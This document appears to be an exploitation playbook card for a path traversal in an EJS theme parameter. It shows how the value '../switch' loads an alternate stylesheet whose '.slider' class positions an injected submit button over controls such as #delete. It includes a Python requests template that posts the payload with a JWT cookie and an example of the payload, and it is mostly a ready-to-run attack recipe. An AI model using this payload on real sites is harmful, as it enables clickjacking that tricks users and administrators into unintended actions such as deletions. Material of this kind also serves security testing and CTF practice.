---
name: ejs_theme_path_traversal_css_injection
vuln_type: path_traversal
sub_technique: template_path_injection
category: exploitation
safety_level: safe
tags:
- path-traversal
- css-injection
- ejs
- theme
- ui-redress
---

# Ejs Theme Path Traversal — Css File Include Via ../ In Theme Parameter

## When to Apply

In EJS (or similar template engine), a user-controllable theme value is directly inserted into the CSS path. In a pattern like `<link href="/css/theme/<%= theme %>.css">`, setting `theme: "../switch"` loads a different CSS file.

## Prerequisites

- Theme parameter is stored in DB or directly reflected from URL
- Inserted into CSS path without server-side validation
- An alternative CSS file exists that can be loaded (within static directory)

## Steps

1. Enter `../switch` in the theme field when creating a post (no server validation)
2. On render: `<link href="/css/theme/../switch.css">` → loads `/css/switch.css`
3. switch.css provides absolute positioning via `.slider` class
4. Insert a submit button with `.slider` class into post content
5. Overlay on top of existing UI elements (#delete, etc.) → click hijacking

## Code Template

```
requests.post('{url}/post/write', json={
    'title': 'test',
    'content': '<form action="/admin/test">'
              '<button type="submit" class="slider"></button>'
              '</form>',
    'theme': '../switch'
}, cookies={'jwt': token})
```

## Examples

### Example 1

- **template**: <link rel="stylesheet" href="/css/theme/<%= post.theme %>.css">
- **payload_theme**: ../switch
- **loaded_css**: /css/switch.css
- **css_effect**: .slider { position: absolute; width/height: 100% }
